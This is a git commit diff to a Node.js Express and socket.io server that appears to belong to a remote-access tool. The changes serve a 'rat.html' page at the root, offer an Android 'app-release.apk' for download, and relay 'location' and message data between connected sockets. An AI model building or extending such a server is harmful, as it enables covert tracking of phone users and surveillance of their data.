6d8f602f888e4ef54f3375f45f32f5c44770d8a2
unknown <wsite079@gmail.com>
2021-12-23 17:44:55 +0600

    newupdate

--- Server.js
+++ Server.js
@@ -1,5 +1,6 @@
 const { json } = require("express");
-var Express = require("express")
+var Express = require("express");
+const { rmSync } = require("fs");
 var App = Express()
 var PORT = process.env.PORT || 4000;
 var http = require("http")
@@ -8,14 +9,14 @@ var socket = require('socket.io')(server)
 
 var path = require('path')
 
+
 App.get('/',(req,res)=>{
-    res.sendFile(path.join(__dirname,"\ viewe".trim(),"\ index.html".trim()))
     
+    res.sendFile(path.join(__dirname,"\ viewe".trim(),"\ rat.html".trim()))
 })
 
-App.get('/rat',(req,res)=>{
-    res.sendFile(path.join(__dirname,"\ viewe".trim(),"\ rat.html".trim()))
-    
+App.get('/apk',(req,res)=>{
+    res.sendFile(path.join(__dirname,"\ viewe ".trim(),"\ app-release.apk".trim()))  
 })
 
 socket.on('connection',Socket=>{
@@ -26,18 +27,22 @@ socket.on('connection',Socket=>{
         Socket.to(valu.room).emit('data',valu.data)
     })
 
+//viewe\app-release.apk'
+
 
 
     Socket.on('join_room',(roomid)=>{
-         console.log(roomid)
-         
          Socket.join(roomid)
      })
 
 
      Socket.on("msg",(data)=>{
-         console.log(data)
+         
         Socket.broadcast.emit("msg", data);
+     })
+
+     Socket.on("location",(data)=>{
+         Socket.broadcast.emit("location",data)
      })
 
     // socket.emit("new message","hi i am server")
